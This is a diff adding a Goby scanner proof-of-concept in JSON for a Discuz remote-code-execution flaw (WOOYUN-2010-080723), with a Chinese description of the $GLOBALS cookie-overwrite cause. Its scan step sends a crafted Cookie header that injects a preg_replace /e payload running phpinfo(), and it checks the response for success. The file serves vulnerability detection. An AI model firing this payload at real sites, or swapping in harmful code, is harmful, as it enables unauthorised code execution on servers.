@@ -1,0 +1,71 @@
+{
+      "Name": "Discuz RCE WOOYUN-2010-080723",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "(app=\"Discuz\" | body=\"Powered by Discuz!\")",
+      "Description": "由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。",
+      "Product": "discuz",
+      "Homepage": "https://www.discuz.net/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/viewthread.php?tid=10",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=phpinfo();"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "PHP Version",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "System",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-17 13:57:54",
+      "GobyVersion": "1.8.302"
+}
